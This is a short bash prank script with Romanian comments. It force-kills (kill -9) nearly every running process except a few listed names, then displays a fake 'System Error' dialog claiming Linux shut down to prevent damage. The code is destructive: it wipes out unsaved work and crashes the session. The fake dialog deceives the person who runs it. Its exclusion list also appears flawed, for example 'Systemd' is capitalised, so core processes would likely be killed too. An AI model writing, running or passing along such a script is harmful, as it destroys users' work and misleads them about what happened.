#!/bin/bash

# Exclude specific processes from being killed
safe_list=("gnome-shell" "xorg" "Systemd" "firefox" "discord")

# Close non-essential applications
echo "Closing non-essential applications..."

# Obține lista de procese active
ps -e -o pid,comm | while read pid comm; do
    # Verificăm dacă procesul nu este în lista de excludere
    if [[ ! " ${safe_list[@]} " =~ " ${comm} " ]]; then
        echo "Terminating process: $comm (PID: $pid)"
        kill -9 $pid
    fi
done

# Simulează un BSOD (background alert)
zenity --info --title="System Error" --text="A problem has been detected and Linux has been shut down to prevent damage to your computer."

# Opriți scriptul
exit 0
